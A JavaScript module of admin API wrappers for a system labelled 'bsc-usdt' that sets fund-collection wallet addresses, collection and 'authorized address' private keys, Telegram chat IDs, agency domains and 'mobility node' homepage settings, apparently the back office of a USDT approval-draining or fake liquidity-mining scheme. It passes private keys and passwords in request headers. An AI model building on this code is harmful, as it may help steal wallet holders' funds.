import { fetcher } from "@/utils/fetcher";

/**
 * 修改归集地址
 */
export const editWalletAddress = (data) => {
  return fetcher({
    method: "POST",
    url: "api-bsc-usdt/collection_address",
    headers: {
      ...data,
    },
  });
};


/**
 * 修改密码
 */
export const editPassWord = (data) => {
  return fetcher({
    method: "POST",
    url: "api-bsc-usdt/update_password",
    headers: {
      ...data,
    },
  });
};

/**
 * 修改密码
 */
export const editChatId = (data) => {
  return fetcher({
    method: "POST",
    url: "api-bsc-usdt/telegram_chatId",
    headers: {
      ...data,
    },
  });
};



/**
 * 获取系统信息
 */
export const getSysInfo = (data) => {
  return fetcher({
    method: "POST",
    url: "api-bsc-usdt/select_admin",
    headers: {
      ...data,
    },
  });
};

/**
 * 设置密钥信息
 */
export const setPrivateKey = (data) => {
  return fetcher({
    method: "POST",
    url: "api-bsc-usdt/collection_private_key",
    headers: {
      ...data,
    },
  });
};

/**
 * 设置授权地址私钥
 */
export const setAuthAddrPrivateKey = (data) => {
  return fetcher({
    method: "POST",
    url: "api-bsc-usdt/collection_wallet_key",
    headers: {
      ...data,
    },
  });
};

/**
 * 获取系统域名
 */
export const getSysDomainList = (data) => {
  return fetcher({
    method: "POST",
    url: "api-bsc-usdt/system_domain_list",
    headers: {
      ...data,
    },
  });
};

/**
 * 添加系统域名
 */
export const addSysDomain = (data) => {
  return fetcher({
    method: "POST",
    url: "api-bsc-usdt/system_domain",
    headers: {
      ...data,
    },
  });
};

/**
 * 修改系统域名
 */
export const editSysDomain = (data) => {
  return fetcher({
    method: "POST",
    url: "api-bsc-usdt/update_system_domain",
    headers: {
      ...data,
    },
  });
};

/**
 * 获取代理域名
 */
export const getProxyDomainList = (data) => {
  return fetcher({
    method: "POST",
    url: "api-bsc-usdt/agency_domain_list",
    headers: {
      ...data,
    },
  });
};



/**
 * 添加代理域名
 */
export const addProxyDomain = (data) => {
  return fetcher({
    method: "POST",
    url: "api-bsc-usdt/agency_domain",
    headers: {
      ...data,
    },
  });
};

/**
 * 修改代理域名
 */
export const editProxyDomain = (data) => {
  return fetcher({
    method: "POST",
    url: "api-bsc-usdt/update_Agency_domain",
    headers: {
      ...data,
    },
  });
};

/**
 * 查询首页配置数据
 */
export const getHomeConfig = (data) => {
  return fetcher({
    method: "POST",
    url: "api-bsc-usdt/mobility_node_select",
    headers: {
      ...data,
    },
  });
};

/**
 * 设置首页配置数据
 */
export const setHomeConfig = (data) => {
  return fetcher({
    method: "POST",
    url: "api-bsc-usdt/mobility_node",
    headers: {
      ...data,
    },
  });
};


